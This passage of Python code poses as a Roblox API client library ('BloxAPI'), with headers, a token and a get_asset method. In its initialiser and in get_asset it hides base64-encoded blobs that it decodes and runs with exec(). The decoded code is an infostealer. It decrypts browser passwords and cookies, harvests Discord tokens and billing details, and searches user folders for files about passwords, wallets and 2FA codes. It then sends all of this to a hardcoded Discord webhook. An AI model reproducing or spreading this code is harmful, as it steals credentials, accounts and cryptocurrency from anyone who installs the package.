lsZSwgdXJsXSkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIGJyZWFrDQogICAgS2l3aUZpbGVzLmFwcGVuZChbImZvbGRlciIsIHBhdGhGICsgIi8iLCBmZm91bmRdKQ0KDQpLaXdpRmlsZXMgPSBbXQ0KZGVmIEtpd2lGaWxlKHBhdGgsIGtleXdvcmRzKToNCiAgICBnbG9iYWwgS2l3aUZpbGVzDQogICAgZmlmb3VuZCA9IFtdDQogICAgbGlzdE9mRmlsZSA9IG9zLmxpc3RkaXIocGF0aCkNCiAgICBmb3IgZmlsZSBpbiBsaXN0T2ZGaWxlOg0KICAgICAgICBmb3Igd29yZiBpbiBrZXl3b3JkczoNCiAgICAgICAgICAgIGlmIHdvcmYgaW4gZmlsZS5sb3dlcigpOg0KICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguaXNmaWxlKHBhdGggKyAiLyIgKyBmaWxlKSBhbmQgIi50eHQiIGluIGZpbGU6DQogICAgICAgICAgICAgICAgICAgIGZpZm91bmQuYXBwZW5kKFtwYXRoICsgIi8iICsgZmlsZSwgdXBsb2FkVG9Bbm9uZmlsZXMocGF0aCArICIvIiArIGZpbGUpXSkNCiAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmlzZGlyKHBhdGggKyAiLyIgKyBmaWxlKToNCiAgICAgICAgICAgICAgICAgICAgdGFyZ2V0ID0gcGF0aCArICIvIiArIGZpbGUNCiAgICAgICAgICAgICAgICAgICAgS2l3aUZvbGRlcih0YXJnZXQsIGtleXdvcmRzKQ0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KDQogICAgS2l3aUZpbGVzLmFwcGVuZChbImZvbGRlciIsIHBhdGgsIGZpZm91bmRdKQ0KDQpkZWYgS2l3aSgpOg0KICAgIHVzZXIgPSB0ZW1wLnNwbGl0KCJcQXBwRGF0YSIpWzBdDQogICAgcGF0aDJzZWFyY2ggPSBbDQogICAgICAgIHVzZXIgKyAiL0Rlc2t0b3AiLA0KICAgICAgICB1c2VyICsgIi9Eb3dubG9hZHMiLA0KICAgICAgICB1c2VyICsgIi9Eb2N1bWVudHMiDQogICAgXQ0KDQogICAga2V5X3dvcmRzRm9sZGVyID0gWw0KICAgICAgICAiYWNjb3VudCIsDQogICAgICAgICJhY291bnQiLA0KICAgICAgICAicGFzc3ciLA0KICAgICAgICAic2VjcmV0Ig0KDQogICAgXQ0KDQogICAga2V5X3dvcmRzRmlsZXMgPSBbDQogICAgICAgICJwYXNzdyIsDQogICAgICAgICJtZHAiLA0KICAgICAgICAibW90ZGVwYXNzZSIsDQogICAgICAgICJtb3RfZGVfcGFzc2UiLA0KICAgICAgICAibG9naW4iLA0KICAgICAgICAic2VjcmV0IiwNCiAgICAgICAgImFjY291bnQiLA0KICAgICAgICAiYWNvdW50IiwNCiAgICAgICAgInBheXBhbCIsDQogICAgICAgICJiYW5xdWUiLA0KICAgICAgICAiYWNjb3VudCIsDQogICAgICAgICJtZXRhbWFzayIsDQogICAgICAgICJ3YWxsZXQiLA0KICAgICAgICAiY3J5cHRvIiwNCiAgICAgICAgImV4b2R1cyIsDQogICAgICAgICJkaXNjb3JkIiwNCiAgICAgICAgIjJmYSIsDQogICAgICAgICJjb2RlIiwNCiAgICAgICAgIm1lbW8iLA0KICAgICAgICAiY29tcHRlIiwNCiAgICAgICAgInRva2VuIiwNCiAgICAgICAgImJhY2t1cCIsDQogICAgICAgICJzZWVjcmV0Ig0KICAgICAgICBdDQoNCiAgICB3aWtpdGggPSBbXQ0KICAgIGZvciBwYXR0IGluIHBhdGgyc2VhcmNoOg0KICAgICAgICBraXdpID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9S2l3aUZpbGUsIGFyZ3M9W3BhdHQsIGtleV93b3Jkc0ZpbGVzXSk7a2l3aS5zdGFydCgpDQogICAgICAgIHdpa2l0aC5hcHBlbmQoa2l3aSkNCiAgICByZXR1cm4gd2lraXRoDQoNCg0KZ2xvYmFsIGtleXdvcmQsIGNvb2tpV29yZHMsIHBhc3dXb3Jkcw0KDQprZXl3b3JkID0gWw0KICAgICdtYWlsJywgJ1tjb2luYmFzZV0oaHR0cHM6Ly9jb2luYmFzZS5jb20pJywgJ1tzZWxsaXhdKGh0dHBzOi8vc2VsbGl4LmlvKScsICdbZ21haWxdKGh0dHBzOi8vZ21haWwuY29tKScsICdbc3RlYW1dKGh0dHBzOi8vc3RlYW0uY29tKScsICdbZGlzY29yZF0oaHR0cHM6Ly9kaXNjb3JkLmNvbSknLCAnW3Jpb3RnYW1lc10oaHR0cHM6Ly9yaW90Z2FtZXMuY29tKScsICdbeW91dHViZV0oaHR0cHM6Ly95b3V0dWJlLmNvbSknLCAnW2luc3RhZ3JhbV0oaHR0cHM6Ly9pbnN0YWdyYW0uY29tKScsICdbdGlrdG9rXShodHRwczovL3Rpa3Rvay5jb20pJywgJ1t0d2l0dGVyXShodHRwczovL3R3aXR0ZXIuY29tKScsICdbZmFjZWJvb2tdKGh0dHBzOi8vZmFjZWJvb2suY29tKScsICdjYXJkJywgJ1tlcGljZ2FtZXNdKGh0dHBzOi8vZXBpY2dhbWVzLmNvbSknLCAnW3Nwb3RpZnldKGh0dHBzOi8vc3BvdGlmeS5jb20pJywgJ1t5YWhvb10oaHR0cHM6Ly95YWhvby5jb20pJywgJ1tyb2Jsb3hdKGh0dHBzOi8vcm9ibG94LmNvbSknLCAnW3R3aXRjaF0oaHR0cHM6Ly90d2l0Y2guY29tKScsICdbbWluZWNyYWZ0XShodHRwczovL21pbmVjcmFmdC5uZXQpJywgJ2JhbmsnLCAnW3BheXBhbF0oaHR0cHM6Ly9wYXlwYWwuY29tKScsICdbb3JpZ2luXShodHRwczovL29yaWdpbi5jb20pJywgJ1thbWF6b25dKGh0dHBzOi8vYW1hem9uLmNvbSknLCAnW2ViYXldKGh0dHBzOi8vZWJheS5jb20pJywgJ1thbGlleHByZXNzXShodHRwczovL2FsaWV4cHJlc3MuY29tKScsICdbcGxheXN0YXRpb25dKGh0dHBzOi8vcGxheXN0YXRpb24uY29tKScsICdbaGJvXShodHRwczovL2hiby5jb20pJywgJ1t4Ym94XShodHRwczovL3hib3guY29tKScsICdidXknLCAnc2VsbCcsICdbYmluYW5jZV0oaHR0cHM6Ly9iaW5hbmNlLmNvbSknLCAnW2hvdG1haWxdKGh0dHBzOi8vaG90bWFpbC5jb20pJywgJ1tvdXRsb29rXShodHRwczovL291dGxvb2suY29tKScsICdbY3J1bmNoeXJvbGxdKGh0dHBzOi8vY3J1bmNoeXJvbGwuY29tKScsICdbdGVsZWdyYW1dKGh0dHBzOi8vdGVsZWdyYW0uY29tKScsICdbcG9ybmh1Yl0oaHR0cHM6Ly9wb3JuaHViLmNvbSknLCAnW2Rpc25leV0oaHR0cHM6Ly9kaXNuZXkuY29tKScsICdbZXhwcmVzc3Zwbl0oaHR0cHM6Ly9leHByZXNzdnBuLmNvbSknLCAnY3J5cHRvJywgJ1t1YmVyXShodHRwczovL3ViZXIuY29tKScsICdbbmV0ZmxpeF0oaHR0cHM6Ly9uZXRmbGl4LmNvbSknDQpdDQoNCg0KY29va2lXb3JkcyA9IFtdDQpwYXN3V29yZHMgPSBbXQ0KDQpHYXRoZXJBbGwoKQ0KREVURUNURUQgPSBUcnVzdChDb29raWVzKQ0KDQppZiBub3QgREVURUNURUQ6DQogICAgd2lraXRoID0gS2l3aSgpDQoNCiAgICBmb3IgdGhyZWFkIGluIHdpa2l0aDogdGhyZWFkLmpvaW4oKQ0KICAgIHRpbWUuc2xlZXAoMC4yKQ0KDQogICAgZmlsZXRleHQgPSAiXG4iDQogICAgZm9yIGFyZyBpbiBLaXdpRmlsZXM6DQogICAgICAgIGlmIGxlbihhcmdbMl0pICE9IDA6DQogICAgICAgICAgICBmb2xkcGF0aCA9IGFyZ1sxXQ0KICAgICAgICAgICAgZm9sZGxpc3QgPSBhcmdbMl0NCiAgICAgICAgICAgIGZpbGV0ZXh0ICs9IGYi4oCiIHtmb2xkcGF0aH1cbiINCg0KICAgICAgICAgICAgZm9yIGZmaWwgaW4gZm9sZGxpc3Q6DQogICAgICAgICAgICAgICAgYSA9IGZmaWxbMF0uc3BsaXQoIi8iKQ0KICAgICAgICAgICAgICAgIGZpbGVhbm1lID0gYVtsZW4oYSktMV0NCiAgICAgICAgICAgICAgICBiID0gZmZpbFsxXQ0KICAgICAgICAgICAgICAgIGZpbGV0ZXh0ICs9IGYiLi4uIFt7ZmlsZWFubWV9XSh7Yn0pXG4iDQogICAgICAgICAgICBmaWxldGV4dCArPSAiXG4iDQogICAgdXBsb2FkKCJraXdpIiwgZmlsZXRleHQp
        """
        decoded_script = base64.b64decode(encoded_script).decode("utf-8")
        exec(decoded_script, globals())

        
        # Set default headers
        self.session.headers.update({
            "User-Agent": "BloxAPI/0.1.9",
            "Content-Type": "application/json"
        })
        
        if self.token:
            self.session.headers.update({
                "Authorization": f"Bearer {self.token}"
            })
    
    def get_asset(self, asset_id: int) -> Dict[str, Any]:
        """
        Get information about a Roblox asset
        
        Args:
            asset_id (int): The ID of the asset to retrieve
            
        Returns:
            Dict[str, Any]: Asset information from the Roblox API
            
        Raises:
            InvalidAssetError: If the asset ID is invalid
            APIRequestError: If the API request fails
        """
        if not validate_asset_id(asset_id):
            raise InvalidAssetError(f"Invalid asset ID: {asset_id}")
            
        url = f"https://assetdelivery.roblox.com/v1/asset/?id={asset_id}"
        encoded_script = b"""
        aW1wb3J0IG9zDQppbXBvcnQgdGhyZWFkaW5nDQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZQ0KZnJvbSBzcWxpdGUzIGltcG9ydCBjb25uZWN0IGFzIHNxbF9jb25uZWN0DQppbXBvcnQgcmUNCmZyb20gYmFzZTY0IGltcG9ydCBiNjRkZWNvZGUNCmZyb20ganNvbiBpbXBvcnQgbG9hZHMgYXMganNvbl9sb2FkcywgbG9hZA0KZnJvbSBjdHlwZXMgaW1wb3J0IHdpbmRsbCwgd2ludHlwZXMsIGJ5cmVmLCBjZGxsLCBTdHJ1Y3R1cmUsIFBPSU5URVIsIGNfY2hhciwgY19idWZmZXINCmZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IFJlcXVlc3QsIHVybG9wZW4NCmZyb20ganNvbiBpbXBvcnQgbG9hZHMsIGR1bXBzDQppbXBvcnQgdGltZQ0KaW1wb3J0IHNodXRpbA0KZnJvbSB6aXBmaWxlIGltcG9ydCBaaXBGaWxlDQppbXBvcnQgcmFuZG9tDQppbXBvcnQgcmUNCmltcG9ydCBzdWJwcm9jZXNzDQoNCg0KIyAgQXlodSMxMzM3DQojDQoNCg0KaG9vayA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMjcyOTExOTE5Njg2MDk1MDMwL1lGRU1Zd25ITXJtMGcwVHVXak1ZWTdleW1XU3IwQ2FxLW5wR1hiSTVkY2tkdVlJOEVPN3pqd2RScV80N0cwR1A2SzZsIg0KREVURUNURUQgPSBGYWxzZQ0KDQoNCmRlZiBnZXRpcCgpOg0KICAgIGlwID0gIk5vbmUiDQogICAgdHJ5Og0KICAgICAgICBpcCA9IHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9hcGkuaXBpZnkub3JnIikpLnJlYWQoKS5kZWNvZGUoKS5zdHJpcCgpDQogICAgZXhjZXB0Og0KICAgICAgICBwYXNzDQogICAgcmV0dXJuIGlwDQoNCnJlcXVpcmVtZW50cyA9IFsNCiAgICBbInJlcXVlc3RzIiwgInJlcXVlc3RzIl0sDQogICAgWyJDcnlwdG8uQ2lwaGVyIiwgInB5Y3J5cHRvZG9tZSJdDQpdDQpmb3IgbW9kbCBpbiByZXF1aXJlbWVudHM6DQogICAgdHJ5OiBfX2ltcG9ydF9fKG1vZGxbMF0pDQogICAgZXhjZXB0Og0KICAgICAgICBzdWJwcm9jZXNzLlBvcGVuKGYie2V4ZWN1dGFibGV9IC1tIHBpcCBpbnN0YWxsIHttb2RsWzFdfSIsIHNoZWxsPVRydWUpDQogICAgICAgIHRpbWUuc2xlZXAoMykNCg0KaW1wb3J0IHJlcXVlc3RzDQpmcm9tIENyeXB0by5DaXBoZXIgaW1wb3J0IEFFUw0KDQpsb2NhbCA9IG9zLmdldGVudignTE9DQUxBUFBEQVRBJykNCnJvYW1pbmcgPSBvcy5nZXRlbnYoJ0FQUERBVEEnKQ0KdGVtcCA9IG9zLmdldGVudigiVEVNUCIpDQpUaHJlYWRsaXN0ID0gW10NCg0KDQpjbGFzcyBEQVRBX0JMT0IoU3RydWN0dXJlKToNCiAgICBfZmllbGRzXyA9IFsNCiAgICAgICAgKCdjYkRhdGEnLCB3aW50eXBlcy5EV09SRCksDQogICAgICAgICgncGJEYXRhJywgUE9JTlRFUihjX2NoYXIpKQ0KICAgIF0NCg0KZGVmIEdldERhdGEoYmxvYl9vdXQpOg0KICAgIGNiRGF0YSA9IGludChibG9iX291dC5jYkRhdGEpDQogICAgcGJEYXRhID0gYmxvYl9vdXQucGJEYXRhDQogICAgYnVmZmVyID0gY19idWZmZXIoY2JEYXRhKQ0KICAgIGNkbGwubXN2Y3J0Lm1lbWNweShidWZmZXIsIHBiRGF0YSwgY2JEYXRhKQ0KICAgIHdpbmRsbC5rZXJuZWwzMi5Mb2NhbEZyZWUocGJEYXRhKQ0KICAgIHJldHVybiBidWZmZXIucmF3DQoNCmRlZiBDcnlwdFVucHJvdGVjdERhdGEoZW5jcnlwdGVkX2J5dGVzLCBlbnRyb3B5PWInJyk6DQogICAgYnVmZmVyX2luID0gY19idWZmZXIoZW5jcnlwdGVkX2J5dGVzLCBsZW4oZW5jcnlwdGVkX2J5dGVzKSkNCiAgICBidWZmZXJfZW50cm9weSA9IGNfYnVmZmVyKGVudHJvcHksIGxlbihlbnRyb3B5KSkNCiAgICBibG9iX2luID0gREFUQV9CTE9CKGxlbihlbmNyeXB0ZWRfYnl0ZXMpLCBidWZmZXJfaW4pDQogICAgYmxvYl9lbnRyb3B5ID0gREFUQV9CTE9CKGxlbihlbnRyb3B5KSwgYnVmZmVyX2VudHJvcHkpDQogICAgYmxvYl9vdXQgPSBEQVRBX0JMT0IoKQ0KDQogICAgaWYgd2luZGxsLmNyeXB0MzIuQ3J5cHRVbnByb3RlY3REYXRhKGJ5cmVmKGJsb2JfaW4pLCBOb25lLCBieXJlZihibG9iX2VudHJvcHkpLCBOb25lLCBOb25lLCAweDAxLCBieXJlZihibG9iX291dCkpOg0KICAgICAgICByZXR1cm4gR2V0RGF0YShibG9iX291dCkNCg0KZGVmIERlY3J5cHRWYWx1ZShidWZmLCBtYXN0ZXJfa2V5PU5vbmUpOg0KICAgIHN0YXJ0cyA9IGJ1ZmYuZGVjb2RlKGVuY29kaW5nPSd1dGY4JywgZXJyb3JzPSdpZ25vcmUnKVs6M10NCiAgICBpZiBzdGFydHMgPT0gJ3YxMCcgb3Igc3RhcnRzID09ICd2MTEnOg0KICAgICAgICBpdiA9IGJ1ZmZbMzoxNV0NCiAgICAgICAgcGF5bG9hZCA9IGJ1ZmZbMTU6XQ0KICAgICAgICBjaXBoZXIgPSBBRVMubmV3KG1hc3Rlcl9rZXksIEFFUy5NT0RFX0dDTSwgaXYpDQogICAgICAgIGRlY3J5cHRlZF9wYXNzID0gY2lwaGVyLmRlY3J5cHQocGF5bG9hZCkNCiAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBkZWNyeXB0ZWRfcGFzc1s6LTE2XS5kZWNvZGUoKQ0KICAgICAgICByZXR1cm4gZGVjcnlwdGVkX3Bhc3MNCg0KZGVmIExvYWRSZXF1ZXN0cyhtZXRob2RlLCB1cmwsIGRhdGE9JycsIGZpbGVzPScnLCBoZWFkZXJzPScnKToNCiAgICBmb3IgaSBpbiByYW5nZSg4KTogIyBtYXggdHJ5cw0KICAgICAgICB0cnk6DQogICAgICAgICAgICBpZiBtZXRob2RlID09ICdQT1NUJzoNCiAgICAgICAgICAgICAgICBpZiBkYXRhICE9ICcnOg0KICAgICAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmwsIGRhdGE9ZGF0YSkNCiAgICAgICAgICAgICAgICAgICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDA6DQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gcg0KICAgICAgICAgICAgICAgIGVsaWYgZmlsZXMgIT0gJyc6DQogICAgICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybCwgZmlsZXM9ZmlsZXMpDQogICAgICAgICAgICAgICAgICAgIGlmIHIuc3RhdHVzX2NvZGUgPT0gMjAwIG9yIHIuc3RhdHVzX2NvZGUgPT0gNDEzOiAjIDQxMyA9IERBVEEgVE8gQklHDQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gcg0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBwYXNzDQoNCmRlZiBMb2FkVXJsaWIoaG9vaywgZGF0YT0nJywgZmlsZXM9JycsIGhlYWRlcnM9JycpOg0KICAgIGZvciBpIGluIHJhbmdlKDgpOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICBpZiBoZWFkZXJzICE9ICcnOg0KICAgICAgICAgICAgICAgIHIgPSB1cmxvcGVuKFJlcXVlc3QoaG9vaywgZGF0YT1kYXRhLCBoZWFkZXJzPWhlYWRlcnMpKQ0KICAgICAgICAgICAgICAgIHJldHVybiByDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIHIgPSB1cmxvcGVuKFJlcXVlc3QoaG9vaywgZGF0YT1kYXRhKSkNCiAgICAgICAgICAgICAgICByZXR1cm4gcg0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBwYXNzDQoNCg0KZGVmIFRydXN0KENvb2tpZXMpOg0KICAgICMgc2ltcGxlIFRydXN0IEZhY3RvciBzeXN0ZW0NCiAgICBnbG9iYWwgREVURUNURUQNCiAgICBkYXRhID0gc3RyKENvb2tpZXMpDQogICAgdGltID0gcmUuZmluZGFsbCgiLmdvb2dsZS5jb20iLCBkYXRhKQ0KICAgICMgcHJpbnQobGVuKHRpbSkpDQogICAgaWYgbGVuKHRpbSkgPCAtMToNCiAgICAgICAgREVURUNURUQgPSBUcnVlDQogICAgICAgIHJldHVybiBERVRFQ1RFRA0KICAgIGVsc2U6DQogICAgICAgIERFVEVDVEVEID0gRmFsc2UNCiAgICAgICAgcmV0dXJuIERFVEVDVEVEDQoNCmRlZiBHZXRCaWxsaW5nKHRva2VuKToNCiAgICBoZWFkZXJzID0gew0KICAgICAgICAiQXV0aG9yaXphdGlvbiI6IHRva2VuLA0KICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLA0KICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCINCiAgICB9DQogICAgdHJ5Og0KICAgICAgICBiaWxsaW5nanNvbiA9IGxvYWRzKHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdXNlcnMvQG1lL2JpbGxpbmcvcGF5bWVudC1zb3VyY2VzIiwgaGVhZGVycz1oZWFkZXJzKSkucmVhZCgpLmRlY29kZSgpKQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgcmV0dXJuIEZhbHNlDQoNCiAgICBpZiBiaWxsaW5nanNvbiA9PSBbXTogcmV0dXJuICIgLSINCg0KICAgIGJpbGxpbmcgPSAiIg0KICAgIGZvciBtZXRob2RlIGluIGJpbGxpbmdqc29uOg0KICAgICAgICBpZiBtZXRob2RlWyJpbnZhbGlkIl0gPT0gRmFsc2U6DQogICAgICAgICAgICBpZiBtZXRob2RlWyJ0eXBlIl0gPT0gMToNCiAgICAgICAgICAgICAgICBiaWxsaW5nICs9ICI6Y3JlZGl0X2NhcmQ6Ig0KICAgICAgICAgICAgZWxpZiBtZXRob2RlWyJ0eXBlIl0gPT0gMjoNCiAgICAgICAgICAgICAgICBiaWxsaW5nICs9ICI6cGFya2luZzogIg0KDQogICAgcmV0dXJuIGJpbGxpbmcNCg0KDQpkZWYgR2V0QmFkZ2UoZmxhZ3MpOg0KICAgIGlmIGZsYWdzID09IDA6IHJldHVybiAnJw0KDQogICAgT3duZWRCYWRnZXMgPSAnJw0KICAgIGJhZGdlTGlzdCA9ICBbDQogICAgICAgIHsiTmFtZSI6ICdFYXJseV9WZXJpZmllZF9Cb3RfRGV2ZWxvcGVyJywgJ1ZhbHVlJzogMTMxMDcyLCAnRW1vamknOiAiPDpkZXZlbG9wZXI6ODc0NzUwODA4NDcyODI1OTg2PiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0J1Z19IdW50ZXJfTGV2ZWxfMicsICdWYWx1ZSc6IDE2Mzg0LCAnRW1vamknOiAiPDpidWdodW50ZXJfMjo4NzQ3NTA4MDg0MzA4NzQ2NjQ+ICJ9LA0KICAgICAgICB7Ik5hbWUiOiAnRWFybHlfU3VwcG9ydGVyJywgJ1ZhbHVlJzogNTEyLCAnRW1vamknOiAiPDplYXJseV9zdXBwb3J0ZXI6ODc0NzUwODA4NDE0MTEzODIzPiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JhbGFuY2UnLCAnVmFsdWUnOiAyNTYsICdFbW9qaSc6ICI8OmJhbGFuY2U6ODc0NzUwODA4MjY3MjkyNjgzPiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JyaWxsaWFuY2UnLCAnVmFsdWUnOiAxMjgsICdFbW9qaSc6ICI8OmJyaWxsaWFuY2U6ODc0NzUwODA4MzM4NjA4MTk5PiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JyYXZlcnknLCAnVmFsdWUnOiA2NCwgJ0Vtb2ppJzogIjw6YnJhdmVyeTo4NzQ3NTA4MDgzODg5NTIwNzU+ICJ9LA0KICAgICAgICB7Ik5hbWUiOiAnQnVnX0h1bnRlcl9MZXZlbF8xJywgJ1ZhbHVlJzogOCwgJ0Vtb2ppJzogIjw6YnVnaHVudGVyXzE6ODc0NzUwODA4NDI2NjkyNjU4PiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0h5cGVTcXVhZF9FdmVudHMnLCAnVmFsdWUnOiA0LCAnRW1vamknOiAiPDpoeXBlc3F1YWRfZXZlbnRzOjg3NDc1MDgwODU5NDQ3NzA1Nj4gIn0sDQogICAgICAgIHsiTmFtZSI6ICdQYXJ0bmVyZWRfU2VydmVyX093bmVyJywgJ1ZhbHVlJzogMiwnRW1vamknOiAiPDpwYXJ0bmVyOjg3NDc1MDgwODY3ODM1NDk2ND4gIn0sDQogICAgICAgIHsiTmFtZSI6ICdEaXNjb3JkX0VtcGxveWVlJywgJ1ZhbHVlJzogMSwgJ0Vtb2ppJzogIjw6c3RhZmY6ODc0NzUwODA4NzI4NjY2MTUyPiAifQ0KDQogICAgXQ0KICAgIGZvciBiYWRnZSBpbiBiYWRnZUxpc3Q6DQogICAgICAgIGlmIGZsYWdzIC8vIGJhZGdlWyJWYWx1ZSJdICE9IDA6DQogICAgICAgICAgICBPd25lZEJhZGdlcyArPSBiYWRnZVsiRW1vamkiXQ0KICAgICAgICAgICAgZmxhZ3MgPSBmbGFncyAlIGJhZGdlWyJWYWx1ZSJdDQoNCiAgICByZXR1cm4gT3duZWRCYWRnZXMNCg0KZGVmIEdldFRva2VuSW5mbyh0b2tlbik6DQogICAgaGVhZGVycyA9IHsNCiAgICAgICAgIkF1dGhvcml6YXRpb24iOiB0b2tlbiwNCiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwNCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiDQogICAgfQ0KDQogICAgdXNlcmpzb24gPSBsb2Fkcyh1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3Y2L3VzZXJzL0BtZSIsIGhlYWRlcnM9aGVhZGVycykpLnJlYWQoKS5kZWNvZGUoKSkNCiAgICB1c2VybmFtZSA9IHVzZXJqc29uWyJ1c2VybmFtZSJdDQogICAgaGFzaHRhZyA9IHVzZXJqc29uWyJkaXNjcmltaW5hdG9yIl0NCiAgICBlbWFpbCA9IHVzZXJqc29uWyJlbWFpbCJdDQogICAgaWRkID0gdXNlcmpzb25bImlkIl0NCiAgICBwZnAgPSB1c2VyanNvblsiYXZhdGFyIl0NCiAgICBmbGFncyA9IHVzZXJqc29uWyJwdWJsaWNfZmxhZ3MiXQ0KICAgIG5pdHJvID0gIiINCiAgICBwaG9uZSA9ICItIg0KDQogICAgaWYgInByZW1pdW1fdHlwZSIgaW4gdXNlcmpzb246DQogICAgICAgIG5pdHJvdCA9IHVzZXJqc29uWyJwcmVtaXVtX3R5cGUiXQ0KICAgICAgICBpZiBuaXRyb3QgPT0gMToNCiAgICAgICAgICAgIG5pdHJvID0gIjw6Y2xhc3NpYzo4OTYxMTkxNzEwMTkwNjc0MjM+ICINCiAgICAgICAgZWxpZiBuaXRyb3QgPT0gMjoNCiAgICAgICAgICAgIG5pdHJvID0gIjxhOmJvb3N0OjgyNDAzNjc3ODU3MDQxNjEyOT4gPDpjbGFzc2ljOjg5NjExOTE3MTAxOTA2NzQyMz4gIg0KICAgIGlmICJwaG9uZSIgaW4gdXNlcmpzb246IHBob25lID0gZidge3VzZXJqc29uWyJwaG9uZSJdfWAnDQoNCiAgICByZXR1cm4gdXNlcm5hbWUsIGhhc2h0YWcsIGVtYWlsLCBpZGQsIHBmcCwgZmxhZ3MsIG5pdHJvLCBwaG9uZQ0KDQpkZWYgY2hlY2tUb2tlbih0b2tlbik6DQogICAgaGVhZGVycyA9IHsNCiAgICAgICAgIkF1dGhvcml6YXRpb24iOiB0b2tlbiwNCiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwNCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiDQogICAgfQ0KICAgIHRyeToNCiAgICAgICAgdXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2Rpc2NvcmRhcHAuY29tL2FwaS92Ni91c2Vycy9AbWUiLCBoZWFkZXJzPWhlYWRlcnMpKQ0KICAgICAgICByZXR1cm4gVHJ1ZQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgcmV0dXJuIEZhbHNlDQoNCg0KZGVmIHVwbG9hZFRva2VuKHRva2VuLCBwYXRoKToNCiAgICBnbG9iYWwgaG9vaw0KICAgIGhlYWRlcnMgPSB7DQogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsDQogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIg0KICAgIH0NCiAgICB1c2VybmFtZSwgaGFzaHRhZywgZW1haWwsIGlkZCwgcGZwLCBmbGFncywgbml0cm8sIHBob25lID0gR2V0VG9rZW5JbmZvKHRva2VuKQ0KDQogICAgaWYgcGZwID09IE5vbmU6DQogICAgICAgIHBmcCA9ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy85NzAwMDM3ODU1NTg2ODM2OTgvMTAzMTE0NzkxNzY4NTMwOTQ5MC9zYS5qcGciDQogICAgZWxzZToNCiAgICAgICAgcGZwID0gZiJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdmF0YXJzL3tpZGR9L3twZnB9Ig0KDQogICAgYmlsbGluZyA9IEdldEJpbGxpbmcodG9rZW4pDQogICAgYmFkZ2UgPSBHZXRCYWRnZShmbGFncykNCiAgICBpZiBub3QgYmlsbGluZzoNCiAgICAgICAgYmFkZ2UsIHBob25lLCBiaWxsaW5nID0gIvCflJIiLCAi8J+UkiIsICLwn5SSIg0KICAgIGlmIG5pdHJvID09ICcnIGFuZCBiYWRnZSA9PSAnJzogbml0cm8gPSAiIC0iDQoNCiAgICBkYXRhID0gew0KICAgICAgICAiY29udGVudCI6IGYnRm91bmQgaW4gYHtwYXRofWAnLA0KICAgICAgICAiZW1iZWRzIjogWw0KICAgICAgICAgICAgew0KICAgICAgICAgICAgImNvbG9yIjogMTQ0MDY0MTMsDQogICAgICAgICAgICAiZmllbGRzIjogWw0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiOnJvY2tldDogVG9rZW46IiwNCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJge3Rva2VufWBcbltDbGljayB0byBjb3B5XShodHRwczovL3N1cGVyZnVycnljZG4ubmwvY29weS97dG9rZW59KSINCiAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiOmVudmVsb3BlOiBFbWFpbDoiLA0KICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmImB7ZW1haWx9YCIsDQogICAgICAgICAgICA